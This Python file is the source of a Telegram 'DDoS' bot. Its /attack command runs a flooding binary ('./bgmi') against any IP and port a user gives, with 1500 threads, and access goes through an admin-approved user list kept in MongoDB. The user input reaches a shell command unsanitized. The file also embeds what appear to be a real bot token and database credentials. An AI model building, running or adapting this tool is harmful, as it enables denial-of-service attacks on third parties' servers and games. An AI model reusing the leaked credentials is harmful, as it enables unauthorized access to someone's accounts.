import asyncio
from pymongo import MongoClient
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from datetime import datetime, timedelta

# Your constants
TELEGRAM_BOT_TOKEN = '7353981909:AAFxPDWWnDQFIZSWY_w_GVjcZDhGibh96Vw'
ADMIN_USER_ID = 1342302666
MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"  # Replace with your MongoDB connection string
DB_NAME = "LEGACY"
COLLECTION_NAME = "users"
attack_in_progress = False
current_attack_end_time = None
BOT_START_TIME = datetime.utcnow()

# MongoDB setup
client = MongoClient(MONGO_URI)
db = client[DB_NAME]
users_collection = db[COLLECTION_NAME]

# Cooldown period
COOLDOWN_PERIOD = timedelta(minutes=5)
MAX_ATTACK_DURATION = 120  # Maximum allowed attack duration in seconds

# MongoDB user management
def add_user_to_db(user_id):
    """Add a user to the MongoDB collection."""
    if not users_collection.find_one({"user_id": user_id}):
        users_collection.insert_one({"user_id": user_id, "last_attack_time": None})
        return True
    return False

def remove_user_from_db(user_id):
    """Remove a user from the MongoDB collection."""
    result = users_collection.delete_one({"user_id": user_id})
    return result.deleted_count > 0

def is_user_in_db(user_id):
    """Check if a user is in the MongoDB collection."""
    return users_collection.find_one({"user_id": user_id}) is not None

def get_last_attack_time(user_id):
    """Retrieve the last attack time for a user."""
    user = users_collection.find_one({"user_id": user_id})
    return user.get("last_attack_time") if user else None

def update_last_attack_time(user_id):
    """Update the last attack time for a user."""
    users_collection.update_one({"user_id": user_id}, {"$set": {"last_attack_time": datetime.utcnow()}})

# Asynchronous command handlers
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the Legacy VIP DDOS🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let Start Fucking ⚔️💥\nDM:-@LEGACY4REAL0*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def legacy(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need admin approval to use this command.*", parse_mode='Markdown')
        return
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /legacy <add|rem> <user_id>*", parse_mode='Markdown')
        return
    command, target_user_id = args
    target_user_id = target_user_id.strip()
    if command == 'add':
        if add_user_to_db(target_user_id):
            await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_user_id} is already in the database.*", parse_mode='Markdown')
    elif command == 'rem':
        if remove_user_from_db(target_user_id):
            await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')
        else:
            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_user_id} not found in the database.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, current_attack_end_time
    attack_in_progress = True
    current_attack_end_time = datetime.utcnow() + timedelta(seconds=int(duration))
    packet_size = 300  # Fixed parameters
    threads = 1500   # Fixed parameters
    try:
        command = f"./bgmi {ip} {port} {duration} {packet_size} {threads}"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")
    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
    finally:
        attack_in_progress = False
        current_attack_end_time = None
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our Legacy DDOS Bot!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, current_attack_end_time
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args
    if not is_user_in_db(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot. Please contact @LEGACY4REAL0*", parse_mode='Markdown')
        return
    if attack_in_progress:
        if current_attack_end_time:
            remaining_time = current_attack_end_time - datetime.utcnow()
            if remaining_time.total_seconds() > 0:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"*⚠️ Another attack is in progress! Remaining time: {remaining_time.seconds // 60} minutes and {remaining_time.seconds % 60} seconds.*",
                    parse_mode='Markdown'
                )
                return
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return
    ip, port, duration = args
    # Validate and adjust duration
    try:
        duration = int(duration)
        if duration > MAX_ATTACK_DURATION:
            duration = MAX_ATTACK_DURATION
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⚠️ Attack duration adjusted to {MAX_ATTACK_DURATION} seconds (maximum allowed).*",
                parse_mode='Markdown'
            )
    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Duration must be an integer.*", parse_mode='Markdown')
        return
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Enjoy And Fuck Whole Lobby 💥*"
    ), parse_mode='Markdown')
    # Update the last attack time for the user
    if user_id != str(ADMIN_USER_ID):
        update_last_attack_time(user_id)
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

# To manage approved users
async def users(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ This command is restricted to the admin.*", parse_mode='Markdown')
        return
    users = users_collection.find()
    if users.count() == 0:
        await context.bot.send_message(chat_id=chat_id, text="*No approved users found.*", parse_mode='Markdown')
        return
    user_list = []
    for user in users:
        last_attack_time = user['last_attack_time']
        last_attack_time_str = last_attack_time.strftime("%Y-%m-%d %H:%M:%S") if last_attack_time else "Never"
        user_list.append(f"ID: {user['user_id']} | Last Attack: {last_attack_time_str}")
    message = "*Approved Users:*\n" + "\n".join(user_list)
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

# Bot uptime
async def uptime(update: Update, context: CallbackContext):
    """Handle the /uptime command to show bot's uptime in minutes:seconds format."""
    uptime_duration = datetime.utcnow() - BOT_START_TIME
    total_seconds = int(uptime_duration.total_seconds())  # Get total uptime in seconds
    minutes = total_seconds // 60  # Calculate minutes
    seconds = total_seconds % 60  # Calculate remaining seconds
    # Format the uptime as "minutes:seconds"
    uptime_str = f"{minutes}min:{seconds}sec"
    message = f"Bot uptime: {uptime_str}"
    await context.bot.send_message(chat_id=update.effective_chat.id, text=message)

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("legacy", legacy))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("uptime", uptime))
    application.run_polling()

if __name__ == '__main__':
    main()
        
